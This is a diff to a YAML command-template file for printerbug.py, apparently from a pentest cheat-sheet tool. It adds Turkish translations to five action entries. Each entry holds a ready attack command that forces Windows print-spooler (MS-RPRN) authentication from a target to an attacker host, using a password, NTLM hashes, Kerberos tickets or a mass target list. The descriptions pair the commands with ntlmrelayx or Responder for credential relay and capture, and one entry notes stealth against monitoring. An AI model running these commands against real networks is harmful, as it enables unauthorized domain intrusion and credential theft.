@@ -2,32 +2,62 @@ tool: printerbug
 tags: [active-directory, pentest, coercion, spooler, impacket]
 
 actions:
- - title: printerbug - coerce auth with password
-   desc: |
-     Triggers MS-RPRN coerce authentication from target to your host.
-     Pair with ntlmrelayx or Responder listening on the attacker host.
+ - title:
+     en: printerbug - coerce auth with password
+     tr: printerbug - parolayla kimlik doğrulama zorlama
+   desc:
+     en: |
+       Triggers MS-RPRN coerce authentication from target to your host.
+       Pair with ntlmrelayx or Responder listening on the attacker host.
+     tr: |
+       MS-RPRN ile hedeften kendi makinenize kimlik doğrulama zorlar.
+       Saldırgan makinede dinleyen ntlmrelayx veya Responder ile birlikte kullanın.
    command: "printerbug.py {{domain}}/{{username}}:{{password}}@{{target}} {{attacker_host}}"
 
- - title: printerbug - coerce with hashes
-   desc: |
-     Coerces authentication using NTLM hashes instead of a password.
-     Standard when only hashes were dumped from a prior host.
+ - title:
+     en: printerbug - coerce with hashes
+     tr: printerbug - hash'lerle zorlama
+   desc:
+     en: |
+       Coerces authentication using NTLM hashes instead of a password.
+       Standard when only hashes were dumped from a prior host.
+     tr: |
+       Parola yerine NTLM hash'leri kullanarak kimlik doğrulama zorlar.
+       Önceki bir makineden yalnızca hash'ler ele geçirildiğinde standart yöntemdir.
    command: "printerbug.py {{domain}}/{{username}}@{{target}} {{attacker_host}} -hashes {{lm_hash|aad3b435b51404eeaad3b435b51404ee}}:{{nt_hash}}"
 
- - title: printerbug - coerce with kerberos
-   desc: |
-     Authenticates with Kerberos tickets from ccache instead of NTLM.
-     Stealthier in environments where NTLM is monitored or restricted.
+ - title:
+     en: printerbug - coerce with kerberos
+     tr: printerbug - Kerberos ile zorlama
+   desc:
+     en: |
+       Authenticates with Kerberos tickets from ccache instead of NTLM.
+       Stealthier in environments where NTLM is monitored or restricted.
+     tr: |
+       NTLM yerine ccache dosyasındaki Kerberos biletleriyle kimlik doğrular.
+       NTLM'in izlendiği veya kısıtlandığı ortamlarda daha gizlidir.
    command: "printerbug.py {{domain}}/{{username}}@{{target}} {{attacker_host}} -k -no-pass -dc-ip {{dc_ip}}"
 
- - title: printerbug - coerce list of targets
-   desc: |
-     Runs coercion against every host in a target file.
-     Use to mass-trigger auth during relay or capture setups.
+ - title:
+     en: printerbug - coerce list of targets
+     tr: printerbug - hedef listesini zorlama
+   desc:
+     en: |
+       Runs coercion against every host in a target file.
+       Use to mass-trigger auth during relay or capture setups.
+     tr: |
+       Hedef dosyasındaki her makineye karşı zorlama çalıştırır.
+       Aktarma (relay) veya yakalama kurulumlarında toplu kimlik doğrulama tetiklemek için kullanın.
    command: "printerbug.py {{domain}}/{{username}}:{{password}}@{{dummy}} {{attacker_host}} -target-file {{targets_file}}"
 
- - title: printerbug - no ping with timeout
-   desc: |
-     Skips the TCP ping check and sets a custom connection timeout.
-     Needed when SMB ports are filtered but still reachable slowly.
+ - title:
+     en: printerbug - no ping with timeout
+     tr: printerbug - ping atlamalı özel zaman aşımı
+   desc:
+     en: |
+       Skips the TCP ping check and sets a custom connection timeout.
+       Needed when SMB ports are filtered but still reachable slowly.
+     tr: |
+       TCP ping denetimini atlar ve özel bir bağlantı zaman aşımı ayarlar.
+       SMB portları filtreli ama yavaş da olsa ulaşılabilir olduğunda gerekir.
    command: "printerbug.py {{domain}}/{{username}}:{{password}}@{{target}} {{attacker_host}} -no-ping -timeout {{seconds|5}}"
